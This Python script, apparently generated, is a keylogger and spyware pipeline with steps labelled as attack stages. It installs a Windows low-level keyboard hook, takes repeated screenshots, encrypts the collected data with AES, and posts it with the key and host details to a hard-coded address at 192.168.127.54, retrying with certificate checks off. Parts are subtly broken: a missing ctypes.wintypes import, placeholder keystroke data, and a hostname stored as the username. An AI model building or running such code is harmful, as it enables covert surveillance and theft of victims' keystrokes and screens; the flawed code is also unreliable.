#!/usr/bin/env python3
import sys, json, time, threading, ctypes, base64, os, requests, socket
from typing import Dict, Any
from io import BytesIO
from PIL import ImageGrab
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Random import get_random_bytes
from requests.exceptions import ConnectionError, Timeout

# Constants for the hook
WH_KEYBOARD_LL = 13
WM_KEYDOWN = 0x0100
CTRL_CODE = 162

# Define the LowLevelKeyboardProc callback function type
LowLevelKeyboardProc = ctypes.WINFUNCTYPE(
    ctypes.c_long,
    ctypes.c_int,
    ctypes.wintypes.WPARAM,
    ctypes.wintypes.LPARAM
)

# Global variable to store the hook ID
hook_id = None

def keyboard_proc(nCode, wParam, lParam):
    if wParam == WM_KEYDOWN:
        # Extract the virtual key code from lParam
        vk_code = ctypes.cast(lParam, ctypes.POINTER(ctypes.wintypes.DWORD)).contents.value
        print(f"Key pressed: {vk_code}")
    # Call the next hook in the chain
    return ctypes.windll.user32.CallNextHookEx(hook_id, nCode, wParam, lParam)

def task_T1(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    global hook_id
    try:
        # Set the hook
        hook_id = ctypes.windll.user32.SetWindowsHookExA(
            WH_KEYBOARD_LL,
            LowLevelKeyboardProc(keyboard_proc),
            ctypes.windll.kernel32.GetModuleHandleW(None),
            0
        )

        if not hook_id:
            return {'success': True, 'data': {'hook_id': None, 'active': False},
                    'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}

        # Message loop to keep the hook active
        msg = ctypes.wintypes.MSG()
        while ctypes.windll.user32.GetMessageA(ctypes.byref(msg), None, 0, 0) != 0:
            ctypes.windll.user32.TranslateMessage(ctypes.byref(msg))
            ctypes.windll.user32.DispatchMessageA(ctypes.byref(msg))

        return {'success': True, 'data': {'hook_id': hook_id, 'active': True},
                'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}
    except Exception as e:
        return {'success': False, 'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}

def low_level_keyboard_proc(nCode, wParam, lParam):
    if wParam == WM_KEYDOWN:
        kbd_struct = ctypes.cast(lParam, ctypes.POINTER(ctypes.c_ulong))
        vk_code = kbd_struct.contents.value
        if vk_code == CTRL_CODE:
            print("CTRL key pressed")
    return ctypes.windll.user32.CallNextHookEx(None, nCode, wParam, lParam)

def setup_keyboard_hook():
    hook = ctypes.windll.user32.SetWindowsHookExA(
        WH_KEYBOARD_LL,
        low_level_keyboard_proc,
        ctypes.windll.kernel32.GetModuleHandleW(None),
        0
    )
    if not hook:
        print("Failed to set hook")
        return False

    # Message loop to keep the hook active
    msg = ctypes.wintypes.MSG()
    while ctypes.windll.user32.GetMessageA(ctypes.byref(msg), None, 0, 0) != 0:
        ctypes.windll.user32.TranslateMessage(ctypes.byref(msg))
        ctypes.windll.user32.DispatchMessageA(ctypes.byref(msg))
    
    return True

def capture_screenshot() -> str:
    try:
        screenshot = ImageGrab.grab()
        buffer = BytesIO()
        screenshot.save(buffer, format='PNG')
        return base64.b64encode(buffer.getvalue()).decode()
    except Exception as e:
        print(f"Screenshot capture failed: {e}")
        return None

def task_T2(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    images = []
    timestamps = []
    try:
        # Start the keyboard hook in a separate thread
        hook_thread = threading.Thread(target=setup_keyboard_hook, daemon=True)
        hook_thread.start()

        # Capture screenshots periodically
        for _ in range(5):  # Capture 5 screenshots for demonstration
            image = capture_screenshot()
            if image:
                images.append(image)
                timestamps.append(time.time())
            time.sleep(1)  # Wait 1 second between captures

        result = {'images': images, 'timestamps': timestamps}
        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}
    except Exception as e:
        return {'success': False, 'data': {'images': [], 'timestamps': []},
                'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}

def task_T3(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    try:
        # Extracting input data
        hook_id = input_data.get('hook_id', 0)
        active = input_data.get('active', False)
        images = input_data.get('images', [])
        timestamps = input_data.get('timestamps', [])

        # Initialize the result dictionary
        result = {
            'keystrokes': [],
            'screenshots': [],
            'timestamps': []
        }

        # Process data only if the hook is active
        if active:
            # Simulate keystroke data capture
            result['keystrokes'] = [f"Keystroke data for hook {hook_id}"]

            # Store screenshots and timestamps
            result['screenshots'] = images
            result['timestamps'] = timestamps

        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}
    except Exception as e:
        # Return partial data on failure
        return {'success': False, 'data': {'keystrokes': [], 'screenshots': [], 'timestamps': []},
                'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}

def task_T4(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    try:
        # Concatenate all buffered data
        buffered_data = json.dumps({
            "keystrokes": input_data.get("keystrokes", []),
            "screenshots": input_data.get("screenshots", []),
            "timestamps": input_data.get("timestamps", [])
        }).encode()

        # Generate random AES key and IV
        key = get_random_bytes(16)
        iv = os.urandom(16)

        # Create AES cipher in CBC mode
        cipher = AES.new(key, AES.MODE_CBC, iv)

        # Pad the buffered data to a 16-byte boundary
        padded_data = pad(buffered_data, AES.block_size)

        # Encrypt the data
        ciphertext = cipher.encrypt(padded_data)

        # Prepare the result with hex-encoded values
        result = {
            "ciphertext": ciphertext.hex(),
            "iv": iv.hex(),
            "key": key.hex()
        }

        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T4', 'execution_time': time.time()-start}}
    except Exception as e:
        # Return partial data on failure
        return {'success': False, 'data': {'ciphertext': None, 'iv': None, 'key': None},
                'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T4', 'execution_time': time.time()-start}}

def task_T5(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    try:
        # Extract and convert input data
        ciphertext = bytes.fromhex(input_data.get('ciphertext', ''))
        iv = bytes.fromhex(input_data.get('iv', ''))
        key = bytes.fromhex(input_data.get('key', ''))

        # Prepare system information
        username = socket.gethostname()
        hostname = socket.getfqdn()

        # Prepare payload
        payload = {
            'ciphertext': ciphertext.hex(),
            'iv': iv.hex(),
            'key': key.hex(),
            'username': username,
            'hostname': hostname
        }

        # Define the remote server URL
        url = "https://192.168.127.54/api"

        # Attempt to send the data with retries
        for attempt in range(3):
            try:
                response = requests.post(url, json=payload, timeout=10, verify=False)
                if response.status_code == 200:
                    return {'success': True, 'data': {},
                            'metadata': {'task_id': 'T5', 'execution_time': time.time()-start}}
            except (ConnectionError, Timeout):
                time.sleep(5)

        # If all attempts fail, return failure
        return {'success': False, 'data': {},
                'metadata': {'task_id': 'T5', 'execution_time': time.time()-start}}

    except Exception as e:
        return {'success': False, 'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T5', 'execution_time': time.time()-start}}

def main() -> dict:
    """Auto-generated orchestrator — do not edit by hand."""
    outputs: dict = {}
    results: dict = {}
    failed:  list = []
    
    # ── T1: Hook Keyboard [execution] ──
    try:
        r = task_T1(None)
        results['T1'] = r
        if r.get('success'):
            outputs['T1'] = r.get('data', {})
            print(f'[+] T1 (Hook Keyboard): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T1 (Hook Keyboard): FAILED — {err}')
            failed.append('T1')
    except Exception as e:
        print(f'[!] T1 crashed: {e}')
        failed.append('T1')
        results['T1'] = {'success': False, 'error': str(e)}
    
    # ── T2: Capture Screenshots [execution] ──
    try:
        r = task_T2(None)
        results['T2'] = r
        if r.get('success'):
            outputs['T2'] = r.get('data', {})
            print(f'[+] T2 (Capture Screenshots): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T2 (Capture Screenshots): FAILED — {err}')
            failed.append('T2')
    except Exception as e:
        print(f'[!] T2 crashed: {e}')
        failed.append('T2')
        results['T2'] = {'success': False, 'error': str(e)}
    
    # ── T3: Buffer Data [data-processing] ──
    try:
        _inp = {}
        _inp.update(outputs.get('T1', {}))
        _inp.update(outputs.get('T2', {}))
        r = task_T3(_inp)
        results['T3'] = r
        if r.get('success'):
            outputs['T3'] = r.get('data', {})
            print(f'[+] T3 (Buffer Data): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T3 (Buffer Data): FAILED — {err}')
            failed.append('T3')
    except Exception as e:
        print(f'[!] T3 crashed: {e}')
        failed.append('T3')
        results['T3'] = {'success': False, 'error': str(e)}
    
    # ── T4: Encrypt Data [defense-evasion] ──
    try:
        r = task_T4(outputs.get('T3', {}))
        results['T4'] = r
        if r.get('success'):
            outputs['T4'] = r.get('data', {})
            print(f'[+] T4 (Encrypt Data): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T4 (Encrypt Data): FAILED — {err}')
            failed.append('T4')
    except Exception as e:
        print(f'[!] T4 crashed: {e}')
        failed.append('T4')
        results['T4'] = {'success': False, 'error': str(e)}
    
    # ── T5: Upload Data [exfiltration] ──
    try:
        r = task_T5(outputs.get('T4', {}))
        results['T5'] = r
        if r.get('success'):
            outputs['T5'] = r.get('data', {})
            print(f'[+] T5 (Upload Data): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T5 (Upload Data): FAILED — {err}')
            failed.append('T5')
            r2 = task_T5(outputs.get('T4', {}))
            if r2.get('success'):
                outputs['T5'] = r2.get('data', {})
                failed.remove('T5')
    except Exception as e:
        print(f'[!] T5 crashed: {e}')
        failed.append('T5')
        results['T5'] = {'success': False, 'error': str(e)}
    
    success = len(failed) == 0
    if success:
        print('[+] All tasks completed successfully')
    else:
        print(f'[-] Failed tasks: {failed}')
    return {'success': success, 'failed': failed,
            'outputs': outputs, 'results': results}

if __name__ == '__main__':
    import json
    result = main()
    print('__RESULT__=' + json.dumps(result))